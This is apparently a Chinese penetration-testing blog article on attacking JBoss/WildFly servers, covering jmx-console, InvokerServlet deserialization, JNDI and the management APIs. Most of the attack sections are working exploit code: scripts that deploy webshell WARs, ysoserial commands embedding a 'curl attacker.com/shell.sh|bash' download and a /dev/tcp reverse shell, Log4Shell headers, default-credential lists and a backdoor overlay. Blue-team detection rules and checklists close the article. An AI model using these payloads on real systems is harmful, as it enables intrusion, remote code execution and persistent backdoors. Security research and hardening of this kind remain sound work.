---
title: "JBoss/WildFly jmx-console InvokerServlet 反序列化 管理面 RCE 利用技术"
date: 2025-06-21T00:00:00+08:00
draft: false
weight: 107
description: "深入分析 JBoss/WildFly 应用服务器的 jmx-console 未授权部署、InvokerServlet 反序列化 RCE、JNDI 注入、管理控制台利用、部署扫描器滥用、Elytron 认证绕过等完整攻击面，覆盖 CVE-2017-12149、CVE-2015-7501 等历史高危漏洞链及蓝队检测与应急响应"
categories: ["安全","渗透测试"]
tags: ["JBoss","WildFly","jmx-console","InvokerServlet","反序列化","CVE-2017-12149","CVE-2015-7501","JNDI注入","管理面","Elytron","RCE"]
---

## 0x00 攻击面总览

JBoss（现更名为 WildFly，由 Red Hat 维护）是全球使用最广泛的 Java EE 应用服务器之一，大量企业级应用、政务系统、金融平台运行于此。JBoss 的攻击面极为丰富，历史漏洞密度极高：

| 攻击面 | 默认端口 | 风险等级 | 说明 |
|--------|---------|---------|------|
| jmx-console | 8080 | **严重** | 未授权访问可直接部署 WAR 实现 RCE |
| JMXInvokerServlet | 8080 | **严重** | 反序列化入口，CVE-2017-12149 |
| Management Console | 9990 | **高危** | HTTP 管理接口，弱口令/默认凭据 |
| Native Management | 9999 | **高危** | 原生管理协议，CLI 远程操控 |
| Deployment Scanner | 文件系统 | **高危** | 文件部署扫描器滥用 |
| Elytron 安全域 | 8080 | **中危** | 认证配置错误导致绕过 |
| JNDI 远程绑定 | 1099/8080 | **严重** | JNDI 注入 + 远程类加载 |
| Web 管理控制台 | 8080 | **高危** | WAR 上传部署 |
| EJB 远程调用 | 4447/8080 | **高危** | EJB 反序列化入口 |
| HTTP Remoting | 8080 | **高危** | 远程 JMX/EJB 通道 |

JBoss 与 WebLogic 类似，同属"反序列化漏洞重灾区"。其核心问题在于：管理接口默认暴露、classpath 中包含丰富的 Gadget 库（Commons Collections 等）、以及 Java EE 规范本身要求的 JNDI/RMI 远程调用能力。

## 0x01 服务识别与版本探测

### 1.1 HTTP 指纹识别

```bash
nmap -sV -p 8080,9990,9999 --script=http-title,http-headers <target>

curl -sI http://TARGET:8080/
# Server: JBossWeb/2.1.x
# X-Powered-By: JBoss, JBossWeb/2.1.x

curl -sI http://TARGET:9990/
# 管理控制台 — 返回 JBoss Management Console 登录页
```

### 1.2 关键路径枚举

```
/jmx-console/                          # JMX 管理控制台（最高危）
/invoker/JMXInvokerServlet             # JMX Invoker 反序列化入口
/invoker/readonly                      # ReadOnlyAccessFilter 反序列化入口
/console/                              # Web 管理控制台
/management/                           # HTTP Management API
/jbossws/services                      # JBoss Web Services
/portal/                               # JBoss Portal
/seam/resource/remoting/               # JBoss Seam 远程调用
/admin-console/                        # Admin Console (EAP 6+)
/management                            # WildFly Management API
```

### 1.3 版本判断

```python
import requests

def detect_jboss_version(host, port=8080):
    base_url = f"http://{host}:{port}"

    # 检查 jmx-console
    resp = requests.get(f"{base_url}/jmx-console/", timeout=5)
    if resp.status_code == 200:
        print("[+] jmx-console accessible (no auth required)")
        # 提取版本信息
        if "JBoss" in resp.text:
            print(f"[+] JBoss detected in jmx-console page")

    # 检查 InvokerServlet
    resp = requests.get(f"{base_url}/invoker/JMXInvokerServlet", timeout=5)
    if resp.status_code == 200:
        content_type = resp.headers.get("Content-Type", "")
        if "serialized" in content_type or "x-java-serialized-object" in content_type:
            print("[+] JMXInvokerServlet accessible — deserialization endpoint confirmed")

    # 检查管理控制台
    resp = requests.get(f"{base_url}/management", timeout=5, auth=("admin", "admin"))
    if resp.status_code == 200:
        print("[+] Management API accessible with default credentials (admin:admin)")

    # 检查 9990 管理端口
    try:
        resp = requests.get(f"http://{host}:9990/management", timeout=5)
        if resp.status_code in [200, 401]:
            print(f"[+] Management console on 9990: status={resp.status_code}")
    except:
        pass

detect_jboss_version("192.168.1.100")
```

## 0x02 jmx-console 未授权访问与 RCE

### 2.1 jmx-console 原理

`jmx-console` 是 JBoss 内置的 JMX（Java Management Extensions）Web 控制台，默认部署在 `/jmx-console/` 路径下。在 JBoss 4.x/5.x/6.x 早期版本中，jmx-console **默认无需认证**即可访问，攻击者可以通过它调用任意 MBean 的方法。

### 2.2 通过 MainDeployer 部署 WAR 实现 RCE

```
攻击路径:
jmx-console → MainDeployer MBean → deploy() 方法 → 部署恶意 WAR → RCE
```

**完整利用步骤**:

```bash
# Step 1: 访问 jmx-console
# http://TARGET:8080/jmx-console/

# Step 2: 查找 MainDeployer MBean
# 在 jmx-console 页面中找到 "jboss.deployer:service=MainDeployer"

# Step 3: 调用 deploy(String url) 方法
# 参数填写攻击者服务器上的恶意 WAR 文件 URL:
# deploy("http://attacker.com:8888/cmd.war")

# Step 4: 访问部署后的 Webshell
# http://TARGET:8080/cmd/cmd.jsp?cmd=id
```

Python 自动化利用：

```python
import requests

def exploit_jmx_console(host, port=8080, war_url="http://attacker:8888/cmd.war"):
    base_url = f"http://{host}:{port}"

    # Step 1: 确认 jmx-console 可访问
    resp = requests.get(f"{base_url}/jmx-console/", timeout=5)
    if resp.status_code != 200:
        print(f"[-] jmx-console not accessible: {resp.status_code}")
        return
    print("[+] jmx-console accessible")

    # Step 2: 通过 MainDeployer 部署 WAR
    deploy_url = f"{base_url}/jmx-console/HtmlAdaptor"
    params = {
        "action": "invokeOpByName",
        "name": "jboss.deployer:service=MainDeployer",
        "methodName": "deploy",
        "argType": "java.lang.String",
        "arg0": war_url
    }

    resp = requests.get(deploy_url, params=params, timeout=15)
    if resp.status_code == 200:
        print("[+] WAR deployment triggered via MainDeployer")
    else:
        print(f"[-] Deployment failed: {resp.status_code}")
        return

    # Step 3: 验证 Webshell
    import time
    time.sleep(3)
    resp = requests.get(f"{base_url}/cmd/cmd.jsp?cmd=id", timeout=5)
    if resp.status_code == 200:
        print(f"[+] RCE confirmed: {resp.text[:200]}")
    else:
        print(f"[-] Webshell not accessible: {resp.status_code}")

exploit_jmx_console("192.168.1.100")
```

### 2.3 通过 createMBean 加载远程类

```
攻击路径:
jmx-console → MBeanServer → createMBean() → 加载远程恶意类 → RCE
```

```bash
# 通过 jmx-console 的 MBeanServer.invoke() 调用 createMBean
# 参数:
#   name: "com.sun.management.jmxremote" (或任意恶意 MBean)
#   code: "http://attacker.com:8888/Exploit.class"
#   codeBase: "http://attacker.com:8888/"

# 实际利用中需要构造完整的 MBean 注册请求
# 建议使用 JBoss exploitation tools (如 jexboss)
```

### 2.4 jmx-console 认证恢复与绕过

JBoss 在后续版本中为 jmx-console 添加了认证保护，但存在多种绕过方式：

```xml
<!-- jmx-console 认证配置位于: deploy/jmx-console.war/WEB-INF/web.xml -->
<!-- 默认注释掉了安全约束:
<security-constraint>
  <web-resource-collection>
    <web-resource-name>HtmlAdaptor</web-resource-name>
    <url-pattern>/*</url-pattern>
  </web-resource-collection>
  <auth-constraint>
    <role-name>JBossAdmin</role-name>
  </auth-constraint>
</security-constraint>
-->
```

如果管理员仅注释了 `<auth-constraint>` 而未删除整个 `<security-constraint>`，某些 JBoss 版本仍会暴露 jmx-console。

## 0x03 InvokerServlet 反序列化攻击

### 3.1 JMXInvokerServlet 原理

`/invoker/JMXInvokerServlet` 是 JBoss 暴露的另一个高危端点。它接收 HTTP POST 请求中的 Java 序列化数据，反序列化后执行 JMX 操作。这意味着攻击者可以直接通过 HTTP 发送恶意序列化对象实现 RCE。

```
POST /invoker/JMXInvokerServlet HTTP/1.1
Host: TARGET:8080
Content-Type: application/x-java-serialized-object
Content-Length: <payload_length>

<Java Serialized Object — 恶意 Gadget Chain>
```

### 3.2 CVE-2017-12149 — InvokerServlet 反序列化 RCE

**CVSS**: 9.8（严重）

**影响版本**: JBoss EAP 5.x/6.x

**漏洞原理**: JBoss EAP 5.x/6.x 的 `InvokerServlet` 在处理 HTTP POST 请求时，直接对请求体进行 Java 反序列化，且未对反序列化类进行任何过滤。攻击者可以利用 JBoss classpath 中的 Commons Collections 等库构造 Gadget 链实现 RCE。

**ysoserial 生成 payload**:

```bash
# CommonsCollections1 链 (JBoss 5.x/6.x)
java -jar ysoserial.jar CommonsCollections1 "curl http://attacker.com/shell.sh|bash" > cc1_payload.bin

# CommonsCollections3 链
java -jar ysoserial.jar CommonsCollections3 "touch /tmp/pwned" > cc3_payload.bin

# CommonsCollections5 链
java -jar ysoserial.jar CommonsCollections5 "id > /tmp/proof" > cc5_payload.bin

# CommonsCollections6 链
java -jar ysoserial.jar CommonsCollections6 "bash -i >& /dev/tcp/attacker/4444 0>&1" > cc6_payload.bin

# CommonsCollections7 链
java -jar ysoserial.jar CommonsCollections7 "whoami" > cc7_payload.bin
```

**发送 payload**:

```python
import requests

def exploit_invoker_servlet(host, port=8080, payload_file="cc1_payload.bin"):
    url = f"http://{host}:{port}/invoker/JMXInvokerServlet"

    with open(payload_file, "rb") as f:
        payload = f.read()

    headers = {
        "Content-Type": "application/x-java-serialized-object",
    }

    resp = requests.post(url, data=payload, headers=headers, timeout=10)
    print(f"[*] Response status: {resp.status_code}")
    print(f"[*] Response length: {len(resp.content)}")

    # 如果返回 200 且 Content-Type 为 x-java-serialized-object，表示反序列化已触发
    if resp.status_code == 200:
        print("[+] Payload delivered — check target for command execution")

exploit_invoker_servlet("192.168.1.100")
```

### 3.3 CVE-2017-12144 — ReadOnlyAccessFilter 反序列化

**影响版本**: JBoss EAP 5.x

**漏洞原理**: 与 CVE-2017-12149 类似，`/invoker/readonly` 端点同样存在反序列化漏洞。该端点使用 `ReadOnlyAccessFilter` 进行访问控制，但过滤器实现存在缺陷，攻击者可以绕过限制触发反序列化。

```python
def exploit_readonly_invoker(host, port=8080, payload_file="cc1_payload.bin"):
    url = f"http://{host}:{port}/invoker/readonly"

    with open(payload_file, "rb") as f:
        payload = f.read()

    headers = {
        "Content-Type": "application/x-java-serialized-object",
    }

    resp = requests.post(url, data=payload, headers=headers, timeout=10)
    print(f"[*] ReadOnly Invoker response: {resp.status_code}")

exploit_readonly_invoker("192.168.1.100")
```

### 3.4 CVE-2015-7501 — Commons Collections 反序列化

**CVSS**: 10.0（严重）

**影响版本**: JBoss 4.x/5.x/6.x, EAP 5.x/6.x

**漏洞原理**: JBoss 内置的 Apache Commons Collections 库（3.2.x 版本）提供了完整的反序列化 Gadget 链。这是 JBoss 反序列化漏洞的"根源"——后续所有 JBoss 反序列化 CVE 都基于此 Gadget 链。

**Gadget 链调用路径**:

```
ObjectInputStream.readObject()
  → AnnotationInvocationHandler.readObject()
    → TransformingMap (TiedMapEntry)
      → LazyMap.get()
        → ChainedTransformer.transform()
          → ConstantTransformer → Runtime.class
          → InvokerTransformer → getRuntime()
          → InvokerTransformer → exec("cmd")
```

**影响版本与 Gadget 映射**:

| JBoss 版本 | Commons Collections 版本 | 可用 Gadget |
|-----------|------------------------|------------|
| JBoss 4.x | CC 3.1 | CC1, CC3, CC5, CC6 |
| JBoss 5.x | CC 3.2 | CC1, CC3, CC5, CC6, CC7 |
| JBoss 6.x | CC 3.2.1 | CC3, CC5, CC6, CC7 (CC1 部分修复) |
| EAP 5.x | CC 3.2 | CC1, CC3, CC5, CC6 |
| EAP 6.x | CC 3.2.2 | CC5, CC6, CC7 (CC1/CC3 黑名单) |

## 0x04 JNDI 注入利用

### 4.1 JBoss 中的 JNDI 架构

JBoss 深度依赖 JNDI（Java Naming and Directory Interface）进行组件查找和远程调用。JNDI 在 JBoss 中的关键使用场景：

- **EJB 远程查找**: `InitialContext.lookup("ejb/remote/bean")`
- **数据源绑定**: `java:/DefaultDS`
- **JMS 连接工厂**: `java:/ConnectionFactory`
- **RMI 远程对象**: `rmi://attacker:1099/malicious`

### 4.2 JNDI 注入 + 远程类加载

```python
import requests

def exploit_jndi_injection(host, port=8080, ldap_url="ldap://attacker:1389/exploit"):
    """
    通过 JBoss 中的 JNDI 注入点触发远程类加载
    常见注入点:
    1. JMXInvokerServlet 反序列化 → JNDI lookup
    2. EJB 远程调用 → JNDI lookup
    3. 应用层 JNDI 注入 (如 Log4Shell)
    """

    # 方式一: 通过反序列化 Gadget 链触发 JNDI lookup
    # ysoserial JRMPClient Gadget:
    # java -jar ysoserial.jar JRMPClient "attacker:1099" > jndi_payload.bin

    # 方式二: 通过应用层 JNDI 注入 (如 Log4j)
    # 如果 JBoss 应用使用了 Log4j < 2.17:
    headers = {
        "X-Api-Version": f"${{jndi:ldap://{ldap_url}}}",
        "User-Agent": f"${{jndi:ldap://{ldap_url}}}",
        "X-Forwarded-For": f"${{jndi:ldap://{ldap_url}}}",
    }

    resp = requests.get(f"http://{host}:{port}/", headers=headers, timeout=5)
    print(f"[*] JNDI injection attempt: {resp.status_code}")

exploit_jndi_injection("192.168.1.100")
```

### 4.3 Log4Shell + JBoss 组合攻击

```
攻击链:
1. JBoss 应用使用 Log4j 记录 HTTP 请求头
2. 攻击者发送包含 ${jndi:ldap://attacker/exploit} 的请求头
3. Log4j 解析 JNDI 表达式 → 连接攻击者 LDAP 服务器
4. LDAP 服务器返回恶意类引用
5. JBoss 通过 URLClassLoader 加载远程恶意类 → RCE
```

```bash
# 启动恶意 LDAP 服务器
# java -jar JNDIExploit.jar -i attacker_ip -p 1389 -l 8888

# 发送 Log4Shell payload
curl -H "X-Api-Version: \${jndi:ldap://attacker:1389/exploit}" \
     http://TARGET:8080/any-endpoint

# JBoss 特有的 JNDI 注入点
# 通过 EJB 查找:
# ${jndi:ldap://attacker:1389/exploit}
# ${jndi:rmi://attacker:1099/exploit}
# ${jndi:dns://attacker:53/exfil}  (数据外带)
```

### 4.4 marshalsec JNDI 利用

```bash
# 启动 RMI 反序列化服务器
java -cp marshalsec.jar marshalsec.JndiExploit "http://attacker:8888/#Exploit"

# 启动 LDAP 反序列化服务器
java -cp marshalsec.jar marshalsec.ldap.LDAPRefServer "http://attacker:8888/#Exploit"

# JBoss 特有的 JNDI 协议支持:
# - rmi:// (RMI 远程对象)
# - ldap:// (LDAP 目录服务)
# - ldaps:// (LDAP over SSL)
# - dns:// (DNS — 可用于数据外带)
```

## 0x05 管理控制台利用

### 5.1 HTTP Management API (端口 9990)

WildFly/JBoss EAP 6+ 使用 HTTP Management API 替代了早期的 jmx-console：

```bash
# 默认凭据测试
curl -s -u admin:admin http://TARGET:9990/management
curl -s -u admin:admin http://TARGET:9990/management/whoami

# 获取服务器信息
curl -s -u admin:admin http://TARGET:9990/management \
  -H "Content-Type: application/json" \
  -d '{"operation":"read-resource","recursive":true}' | python3 -m json.tool

# 获取部署列表
curl -s -u admin:admin http://TARGET:9990/management/deployment=* \
  -H "Content-Type: application/json" \
  -d '{"operation":"read-resource"}' | python3 -m json.tool
```

### 5.2 通过 Management API 部署 WAR

```python
import requests
import json

def deploy_war_via_management(host, port=9990, war_path="/tmp/cmd.war",
                               username="admin", password="admin"):
    mgmt_url = f"http://{host}:{port}/management"

    # Step 1: 上传 WAR 文件到 content repository
    with open(war_path, "rb") as f:
        war_data = f.read()

    # 计算 SHA1 用于内容引用
    import hashlib
    sha1 = hashlib.sha1(war_data).hexdigest()

    # 上传内容
    upload_url = f"{mgmt_url}/add-content"
    files = {"file": ("cmd.war", war_data, "application/octet-stream")}
    data = {"hash": sha1}

    resp = requests.post(upload_url, files=files, data=data,
                         auth=(username, password), timeout=30)
    print(f"[*] Upload status: {resp.status_code}")

    # Step 2: 部署应用
    deploy_payload = {
        "operation": "add",
        "address": [{"deployment": "cmd.war"}],
        "content": [{"hash": {"BYTES_VALUE": sha1}}],
        "enabled": "true"
    }

    resp = requests.post(mgmt_url,
                         data=json.dumps(deploy_payload),
                         headers={"Content-Type": "application/json"},
                         auth=(username, password), timeout=15)
    print(f"[*] Deploy status: {resp.status_code}")
    print(f"[+] Access: http://{host}:8080/cmd/cmd.jsp?cmd=id")

deploy_war_via_management("192.168.1.100")
```

### 5.3 Native Management (端口 9999)

```bash
# 使用 jboss-cli.sh 连接 Native Management
./bin/jboss-cli.sh --connect controller=TARGET:9999 --user=admin --password=admin

# 连接后执行管理命令:
# [standalone@TARGET:9999 /] deploy /tmp/cmd.war
# [standalone@TARGET:9999 /] /deployment=cmd.war:read-resource
# [standalone@TARGET:9999 /] /subsystem=datasources:read-resource

# 通过 Native Management 执行系统命令 (需要 jboss-cli)
# [standalone@TARGET:9999 /] /core-service=management/service=configuration-changes:read-changes-history(max-history=10)
```

### 5.4 弱口令与默认凭据

```
常见 JBoss/WildFly 默认凭据:
admin:admin
admin:
admin:admin123
admin:password
admin:jb0ss
admin:Jboss@123
admin:Redhat@123

管理用户配置文件位置:
# JBoss 4.x/5.x:
server/default/conf/props/jmx-console-users.properties
server/default/conf/props/web-console-users.properties

# JBoss EAP 6.x / WildFly:
standalone/configuration/mgmt-users.properties
domain/configuration/mgmt-users.properties
```

## 0x06 部署扫描器滥用

### 6.1 文件部署机制

JBoss/WildFly 的 Deployment Scanner 会持续监控部署目录，当检测到新的 WAR/EAR 文件或 marker 文件时自动触发部署：

```
部署目录:
# Standalone 模式:
standalone/deployments/

# Domain 模式:
domain/deployments/

# JBoss 4.x/5.x:
server/default/deploy/
```

### 6.2 Marker 文件控制

```bash
# Marker 文件类型:
# .dodeploy    — 触发部署
# .deployed    — 部署成功标记
# .failed      — 部署失败标记
# .undeployed  — 取消部署标记
# .isdeploying — 正在部署标记

# 如果已有文件上传能力（如通过管理控制台或 NFS 挂载）:
# 1. 上传恶意 WAR 到部署目录
# 2. 创建 .dodeploy marker 文件触发部署
touch standalone/deployments/cmd.war.dodeploy

# 3. 等待部署完成后访问 Webshell
curl http://TARGET:8080/cmd/cmd.jsp?cmd=id
```

### 6.3 Deployment Overlay 持久化

```bash
# Deployment Overlay 允许覆盖已部署应用中的文件
# 可用于注入恶意配置或后门

# 通过 jboss-cli 创建 overlay:
# [standalone@TARGET:9999 /] deployment-overlay add --name=backdoor --content=/WEB-INF/web.xml=./malicious-web.xml --target-deployments=*.war

# 通过 Management API:
curl -s -u admin:admin http://TARGET:9990/management/deployment-overlay=backdoor \
  -H "Content-Type: application/json" \
  -d '{"operation":"add","content":{"/WEB-INF/web.xml":"BYTES_VALUE"}}'
```

## 0x07 Elytron 安全域认证绕过

### 7.1 Elytron 架构

WildFly 11+ 引入了 Elytron 作为统一安全框架，替代了旧的 JAAS/PicketBox 安全模型。Elytron 配置错误可导致认证绕过：

```xml
<!-- Elytron 安全域配置 (standalone/configuration/standalone.xml) -->
<subsystem xmlns="urn:wildfly:elytron:14.0">
  <security-domains>
    <security-domain name="ApplicationDomain">
      <permission-mapper name="default-permission-mapper"/>
      <principal-decoder name="combined-principal-decoder"/>
      <security-realm name="ApplicationRealm"/>
    </security-domain>
  </security-domains>

  <security-realms>
    <properties-realm name="ApplicationRealm">
      <users-properties path="application-users.properties"
                        relative-to="jboss.server.config.dir"/>
    </properties-realm>
  </security-realms>
</subsystem>
```

### 7.2 SASL ANONYMOUS 机制绕过

```bash
# 如果 Elytron 配置中启用了 SASL ANONYMOUS 机制:
# <sasl-authentication-factory name="management-sasl"
#   <mechanism-configuration>
#     <mechanism mechanism-name="ANONYMOUS"/>
#   </mechanism-configuration>

# 攻击者可以匿名连接到 Native Management:
./bin/jboss-cli.sh --connect controller=TARGET:9999
# 无需用户名密码即可连接

# 通过 Python 直接利用:
import socket

def connect_anonymous_native(host, port=9999):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    # WildFly Native Management 协议握手
    # 发送 SASL ANONYMOUS 认证
    handshake = b"\x00\x00\x00\x01"  # 协议版本
    sock.send(handshake)
    resp = sock.recv(1024)
    print(f"[*] Native Management response: {resp.hex()}")
    sock.close()

connect_anonymous_native("192.168.1.100")
```

### 7.3 LDAP 注入绕过 Elytron

```
攻击场景:
如果 Elytron 使用 LDAP 安全域 (ldap-realm) 进行认证:
1. 攻击者构造特殊用户名进行 LDAP 注入
2. 绕过认证检查
3. 以任意用户身份登录管理控制台

注入 payload:
用户名: admin)(uid=*))(|(uid=*
密码: (任意)

LDAP 查询变为:
(&(uid=admin)(uid=*))(|(uid=*)(uid=...))(password=xxx)
→ 返回所有用户 → 认证绕过
```

## 0x08 JBoss Seam 反序列化 (CVE-2010-1871)

### 8.1 JBoss Seam 2 组件 RCE

**CVSS**: 9.8

**影响版本**: JBoss Seam 2.x (随 JBoss EAP 4.x/5.x 部署)

**漏洞原理**: JBoss Seam 的 `Resource` 组件允许通过 EL（Expression Language）表达式执行任意代码。攻击者通过构造特殊的 URL 参数触发 EL 表达式注入。

```bash
# PoC URL:
# http://TARGET:8080/seam-home/seam/resource/remoting/resource/
#   ?actionOutcome=/success.xhtml?user%3d#{expression}

# 执行命令的 EL 表达式:
# #{runtime:exec('touch /tmp/pwned')}

# 完整 PoC:
curl "http://TARGET:8080/seam-home/seam/resource/remoting/resource/?actionOutcome=/success.xhtml?user%3d%23%7bruntime%3aexec('id')%7d"
```

## 0x09 JBoss 反序列化回显技术

### 9.1 无回显 RCE 的问题

JBoss InvokerServlet 反序列化默认无回显——命令执行结果不会通过 HTTP 响应返回。攻击者需要使用以下技术获取命令执行结果：

### 9.2 DNSLog 外带

```bash
# 使用 ysoserial 的 URLDNS 链进行 DNS 验证
java -jar ysoserial.jar URLDNS "http://xxx.dnslog.cn/proof" > urldns_payload.bin

# 命令执行结果通过 DNS 外带:
# 使用 bash 反连:
java -jar ysoserial.jar CommonsCollections6 \
  "curl http://attacker:8888/\$(whoami)" > dns_exfil_payload.bin
```

### 9.3 内存 Webshell 注入

```python
# 通过反序列化链注入内存 Webshell
# 原理: 通过反射向 JBossWeb/Tomcat 的 Context 中注册恶意 Servlet

# 核心思路:
# 1. 反序列化触发 → 获取 StandardContext
# 2. 通过反射创建 Wrapper (Servlet 容器)
# 3. 设置 Servlet 类为恶意命令执行类
# 4. 注册到 Context 的 Servlet 映射中
# 5. 后续 HTTP 请求即可触发命令执行

# 建议使用 ysoserial-modified 的 Echo 模块
# 或 JNDIExploit 的内存马注入功能
```

### 9.4 写文件回显

```bash
# 最简单的方式: 命令结果写入 Web 目录
java -jar ysoserial.jar CommonsCollections6 \
  "bash -c 'id > /opt/jboss/standalone/deployments/root.war/proof.txt'" > write_payload.bin

# 然后访问:
curl http://TARGET:8080/proof.txt
```

## 0x10 历史 CVE 漏洞时间线

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2010-1871 | 2010 | 9.8 | Seam EL 注入 | JBoss Seam 表达式注入 RCE |
| CVE-2010-0738 | 2010 | 10.0 | jmx-console | jmx-console 认证绕过 |
| CVE-2010-1428 | 2010 | 10.0 | jmx-console | jmx-console 弱口令 |
| CVE-2015-7501 | 2015 | 10.0 | 反序列化 | Commons Collections Gadget 链 |
| CVE-2016-7065 | 2016 | 9.8 | 反序列化 | JBoss Marshalling 新 Gadget |
| CVE-2017-12144 | 2017 | 10.0 | 反序列化 | ReadOnlyAccessFilter 反序列化 |
| CVE-2017-12149 | 2017 | 10.0 | 反序列化 | InvokerServlet 反序列化 RCE |
| CVE-2017-12150 | 2017 | 10.0 | 反序列化 | HTTP Invoker 反序列化 |
| CVE-2019-3889 | 2019 | 7.5 | 路径穿越 | WildFly 管理控制台路径穿越 |
| CVE-2019-10194 | 2019 | 7.5 | 反序列化 | WildFly IIOP 反序列化 |
| CVE-2021-3629 | 2021 | 7.5 | 路径穿越 | WildFly 管理控制台文件读取 |

**规律总结**: JBoss 的反序列化漏洞与 WebLogic 类似，呈现"补丁→绕过→新 CVE"的循环。核心问题在于 Java 序列化协议本身的安全缺陷以及 JBoss classpath 中丰富的 Gadget 库。

## 0x11 蓝队检测与应急响应

### 11.1 网络层检测规则

```
# jmx-console 未授权访问
alert tcp any any -> any 8080 (msg:"JBoss jmx-console Access"; content:"/jmx-console/"; nocase; sid:2000001;)

# InvokerServlet 反序列化攻击
alert tcp any any -> any 8080 (msg:"JBoss InvokerServlet POST"; content:"/invoker/JMXInvokerServlet"; content:"POST"; nocase; sid:2000002;)
alert tcp any any -> any 8080 (msg:"JBoss ReadOnly Invoker"; content:"/invoker/readonly"; content:"POST"; nocase; sid:2000003;)

# Java 序列化特征
alert tcp any any -> any 8080 (msg:"Java Serialized Object"; content:"|aced0005|"; sid:2000004;)

# Management API 默认凭据
alert tcp any any -> any 9990 (msg:"JBoss Management API"; content:"/management"; content:"Basic"; sid:2000005;)

# JNDI 注入特征
alert tcp any any -> any 8080 (msg:"JNDI LDAP Injection"; content:"jndi:ldap"; nocase; sid:2000006;)
alert tcp any any -> any 8080 (msg:"JNDI RMI Injection"; content:"jndi:rmi"; nocase; sid:2000007;)

# Log4Shell 特征
alert tcp any any -> any 8080 (msg:"Log4Shell JNDI Lookup"; content:"${jndi:"; nocase; sid:2000008;)
```

### 11.2 日志分析

```bash
# 检查 jmx-console 异常访问
grep "/jmx-console/" access.log | grep -v "401\|403"

# 检查 InvokerServlet 攻击
grep "/invoker/JMXInvokerServlet" access.log
grep "/invoker/readonly" access.log

# 检查 Management API 异常
grep "/management" access.log | grep "200"

# 检查 JNDI 注入尝试
grep -i "jndi:" access.log
grep -i "\${jndi" access.log
grep -i "ldap://" access.log
grep -i "rmi://" access.log

# 检查异常部署
grep "deploy" server.log | grep -i "error\|warn\|success"

# 检查 WAR 部署记录
grep -r "deploy" standalone/deployments/ | grep ".war"
```

### 11.3 应急响应清单

```
[ ] 确认 JBoss/WildFly 版本与已安装补丁
    - 检查 standalone/configuration/standalone.xml 中的版本信息
    - 确认 Red Hat 安全公告状态

[ ] 检查 jmx-console 是否对外暴露
    - 从外网访问 /jmx-console/ 路径
    - 检查 web.xml 中的安全约束配置

[ ] 检查 InvokerServlet 是否可访问
    - POST /invoker/JMXInvokerServlet
    - POST /invoker/readonly
    - 如不需要，在 web.xml 中禁用

[ ] 排查反序列化攻击
    - 检查 access.log 中的 InvokerServlet POST 请求
    - 搜索 Java 序列化魔术字节 |aced0005|
    - 检查服务器日志中的 ClassNotFoundException

[ ] 检查 Management API 安全
    - 验证 9990/9999 端口是否对外暴露
    - 检查 mgmt-users.properties 中的用户列表
    - 验证是否使用默认凭据

[ ] 排查 JNDI 注入
    - 搜索日志中的 ${jndi: 模式
    - 检查所有 HTTP 请求头是否包含 JNDI 表达式
    - 验证 Log4j 版本 ≥ 2.17.0

[ ] 检查异常部署
    - 扫描 deployments/ 目录下的异常 WAR/EAR 文件
    - 检查 Management API 的部署记录
    - 对比已知合法部署列表

[ ] 网络隔离与加固
    - 禁用 jmx-console 和 InvokerServlet
    - 限制 Management API 为内网访问
    - 升级 JBoss/WildFly 到最新版本
    - 应用 Red Hat 安全补丁
```

## 0x12 安全审计清单

```
[ ] jmx-console 已禁用或添加认证保护
[ ] InvokerServlet (/invoker/*) 已禁用
[ ] Management API (9990/9999) 仅内网可达
[ ] 管理控制台使用强密码，非默认凭据
[ ] JBoss/WildFly 版本为最新稳定版
[ ] 已应用所有 Red Hat Critical Patch Update
[ ] Deployment Scanner 仅监控必要目录
[ ] Elytron 安全域配置正确，未启用 ANONYMOUS 机制
[ ] Log4j 版本 ≥ 2.17.0 (防 Log4Shell)
[ ] Commons Collections 已从 classpath 中移除或升级
[ ] 部署 WAF 并配置 JBoss 专项检测规则
[ ] 监控 JVM 类加载行为，检测内存马注入
[ ] 定期检查部署目录下的异常 WAR/EAR 文件
[ ] 配置 access.log 远程收集与实时告警
[ ] 启用 JBoss Audit Logging 记录管理操作
```

## 0x13 总结

JBoss/WildFly 的安全态势与 WebLogic 类似，属于"反序列化漏洞高发区"。其核心攻击面可以归纳为三大类：

1. **管理接口暴露**: jmx-console、InvokerServlet、Management API 等管理接口默认或配置错误导致未授权访问，是最直接的攻击路径
2. **反序列化 RCE**: 基于 Commons Collections 等 Gadget 链的反序列化漏洞持续爆发，T3/HTTP/IIOP 多通道攻击面与 WebLogic 如出一辙
3. **JNDI 注入**: JBoss 对 JNDI 的深度依赖使得 Log4Shell 等漏洞的影响尤为严重，远程类加载可直接导致 RCE

防守方核心策略：
- **最小化暴露面**: 禁用 jmx-console、InvokerServlet 等不必要的管理端点
- **网络隔离**: Management API (9990/9999) 绝对不暴露于互联网
- **及时补丁**: 跟进 Red Hat 安全公告，第一时间应用补丁
- **纵深防御**: WAF + IDS + 运行时监控 + 内存马检测
- **依赖治理**: 移除 classpath 中不必要的 Commons Collections 等危险库
